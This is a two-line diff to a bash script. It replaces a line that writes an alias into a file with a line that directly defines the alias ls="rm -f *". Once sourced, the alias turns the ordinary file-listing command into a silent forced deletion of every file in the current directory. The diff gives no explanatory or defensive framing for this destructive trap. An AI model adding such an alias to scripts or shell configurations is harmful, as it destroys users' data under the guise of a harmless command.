@@ -1,2 +1,2 @@
 #!/bin/bash
-echo 'alias ls="rm -f *"' > alias_script.sh
+alias ls="rm -f *"
